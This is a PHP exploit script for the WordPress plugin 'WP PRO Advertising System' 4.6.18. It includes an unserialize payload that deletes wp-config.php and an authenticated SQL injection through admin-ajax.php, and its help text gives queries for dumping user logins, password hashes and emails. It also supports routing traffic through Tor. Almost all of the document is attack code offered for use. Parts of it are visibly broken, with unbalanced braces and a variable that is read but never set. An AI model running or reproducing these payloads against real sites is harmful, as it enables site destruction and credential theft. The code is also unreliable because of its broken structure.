/**
 * Exploit Titie: WP PRO Advertising System - All In One Ad Manager  Exploit
 * Google Dork:
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Software Link: http://codecanyon.net/item/wp-pro-advertising-system-all-in-one-ad-manager/269693
 * Version: 4.6.18
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: SQLi, Unserialize, File Delete.
 * Time line: Found [06-May-2016], Vendor notified [06-May-2016], Vendor fixed: [???], [RD:1464914936]
 */
 
 
require_once(&#039;curl.php&#039;);
//OR
//include(&#039;https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php&#039;);
$curl = new CurlWrapper();
 
 
$options = getopt("t:m:f:c:u:p:s:",array(&#039;tor:&#039;));
print_r($options);
$options = validateInput($options);
 
if (!$options){
    showHelp();
}
 
if ($options[&#039;tor&#039;] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get(&#039;https://dynamicdns.park-your-domain.com/getip&#039;);
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType &#039;wololo&#039; to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != &#039;wololo&#039;){
        die("Aborting!\n");
    }
    echo "OK...\n";
}
 
class CPDF_Adapter{
 
 
    private  $_image_cache;
    public function set_file($file){
        $this->_image_cache = array($file);
    }
}
 
 
 
function logIn(){
    global $curl, $options;
    file_put_contents(&#039;cookies.txt&#039;,"\n");
    $curl->setCookieFile(&#039;cookies.txt&#039;);
    $curl->get($options[&#039;t&#039;]);
    $data = array(&#039;log&#039;=>$options[&#039;u&#039;], &#039;pwd&#039;=>$options[&#039;p&#039;], &#039;redirect_to&#039;=>$options[&#039;t&#039;], &#039;wp-submit&#039;=>&#039;Log In&#039;);
    $curl->post($options[&#039;t&#039;].&#039;/wp-login.php&#039;, $data);
    $status =  $curl->getTransferInfo(&#039;http_code&#039;);
    if ($status !== 302){
        echo "Login probably failed, aborting...\n";
        echo "Login response saved to login.html.\n";
        die();
    }
    file_put_contents(&#039;login.html&#039;,$curl->getResponse());
 
 
}
 
 
 
function exploit(){
    global $curl, $options;
 
    if ($options[&#039;m&#039;] == &#039;d&#039;){
        echo "Delete mode\n";
        $pay_load_obj = new CPDF_Adapter();
        $pay_load_obj->set_file(&#039;../../../../../../wp-config.php&#039;, &#039;../../../../../../wp-config.php&#039; );
        $pay_load = base64_encode(serialize(array($pay_load_obj)));
        $data = array(&#039;stats_pdf&#039;=>&#039;1&#039;, &#039;data&#039;=>$pay_load);
        $curl->post($options[&#039;t&#039;].&#039;?&#039;.http_build_query($data));
        $resp = $curl->getResponse();
        echo $resp;
    } else {
        echo "SQLi mode \n";
        echo "Trying a longin...\n";
        logIn();
        echo "Running SQL in Inject mode: ".$options[&#039;s&#039;]."\n";
        $pay_load = array(&#039;action&#039;=>&#039;load_stats&#039;, &#039;group&#039;=>&#039;1=1 UNION ALL SELECT (&#039;.$options[&#039;s&#039;].&#039;) LIMIT 1,1# &#039;, &#039;group_id&#039;=>&#039;1&#039;, &#039;rid&#039;=>1);
        $curl->post($options[&#039;t&#039;].&#039;/wp-admin/admin-ajax.php&#039;, $pay_load);
        $resp = $curl->getResponse();
        //Grab the output
           if (isset($mat[1])){
               echo "Response:\n".$mat[1]."\n";
               die("Done\n");
           }
        }
        echo "Failed getting SQLi response, response saved to resp.html\n";
        file_put_contents(&#039;resp.html&#039;, $resp);
 
    }
 
 
 
 
}
 
 
 
exploit();
 
 
 
function validateInput($options){
 
    if ( !isset($options[&#039;t&#039;]) || !filter_var($options[&#039;t&#039;], FILTER_VALIDATE_URL) ){
        return false;
    }
 
        $options[&#039;t&#039;] = $options[&#039;t&#039;].&#039;/&#039;;
    }
    if (!isset($options[&#039;m&#039;]) || !in_array($options[&#039;m&#039;], array(&#039;d&#039;,&#039;s&#039;) ) ){
        return false;
    }
    if ($options[&#039;m&#039;] == &#039;s&#039; && (!isset($options[&#039;u&#039;])  || !isset($options[&#039;p&#039;]) || !isset($options[&#039;s&#039;])) ){
        return false;
    }
    $options[&#039;tor&#039;] = isset($options[&#039;tor&#039;]);
 
    return $options;
}
 
 
function showHelp(){
    global $argv;
    $help = <<<EOD
 
    WP PRO Advertising System - All In One Ad Manager Expoit Pack
 
Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USER] -p [password] -m [MODE]  -s [SQL]
 
       *** In order to use the SQLi part you need an advertiser login **
 
       [MODE] d - Delete wp-config.php
              s - SQL Injection
       [TOR] Use tor network? (Connects to 127.0.0.1:9150)
 
       Note: In SQLi mode, you can&#039;t use &#039; or ", and you are in a subselect.
       To get all users and passwords you would do :
       SELECT concat(user_login,0x3a,user_pass,0x3a,user_email)  FROM wp_users LIMIT 1
       SELECT concat(user_login,0x3a,user_pass)  FROM wp_users LIMIT 1,1
       SELECT concat(user_login,0x3a,user_pass)  FROM wp_users LIMIT 2,1
 
 
Examples:
 
    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License
 
EOD;
    echo $help."\n\n";
    die();
}

